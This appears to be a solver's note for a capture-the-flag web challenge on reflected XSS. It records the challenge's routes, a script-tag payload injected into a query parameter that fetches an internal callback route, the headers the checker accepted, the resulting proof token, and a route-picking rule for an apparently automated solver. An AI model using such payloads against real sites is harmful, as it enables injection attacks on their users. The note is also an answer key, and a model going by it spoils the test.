# Reflect Upon This (D21 web, reflected XSS -> isolated callback)

Derived (TT e61bd257, from the live worker's recorded responses): /api/clues ->
`{"feature_route":"/process-6d453d","secondary_route":"/internal-8c5b43","callback_nonce":"cce6763a8286"}`;
`/process-6d453d?q=<script>fetch('/internal-8c5b43?nonce=N')</script>` reflects; GET `/internal-8c5b43?nonce=N` with
Sec-Fetch-* same-origin + Referer=reflected URL + Origin + X-Callback-Nonce ->
`{"ok":true,"effect":"isolated_browser_callback","evidence":"proof_30bb44c457d241229c129c86b06c9287"}` (GM CORRECT).

VARIANT AXIS: callback route word -- single `secondary_route: /callback-<hex6>`, TT `secondary_route: /internal-<hex6>` (feature route word varies too: execute/process); rule: callback = route with `callback` in key/value, else `secondary`/`internal`/`isolat` key/value, else the first `/...` route that is not `feature_route`.

## Proposed lib additions
- web: pick the XSS callback route from /api/clues by role (`secondary_route` / non-feature route), never by the word `callback` in its value.
